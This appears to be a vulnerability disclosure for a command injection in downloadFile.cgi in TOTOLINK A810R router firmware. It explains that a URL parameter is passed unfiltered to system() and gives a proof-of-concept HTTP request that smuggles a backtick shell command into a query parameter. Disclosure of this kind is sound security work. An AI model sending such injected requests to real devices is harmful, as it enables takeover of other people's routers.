# Command Injection
# A810R_Firmware
version: V5.9c.2280_B20180512
# Description
There is a command injection in downloadFile.cgi. 
This bug still exist in  [V5.9c.2280_B20180512](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/169/ids/36.html).
# Analyse
After obtaining the URL parameter, it is directly incorporated into the system function for execution without checking and filtering


![Snipaste_2022-09-10_16-25-46](https://user-images.githubusercontent.com/53329533/189476761-ae9092cd-e178-4cb1-83a3-15c2e9e4d48b.png)

![Snipaste_2022-09-10_16-39-50](https://user-images.githubusercontent.com/53329533/189476764-444f2ea3-4816-466f-aa6a-03a462df9a00.png)


# POC
```
GET /cgi-bin/downloadFlile.cgi?payload=`dw>../2.txt` HTTP/1.1
Host: 192.168.163.165
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
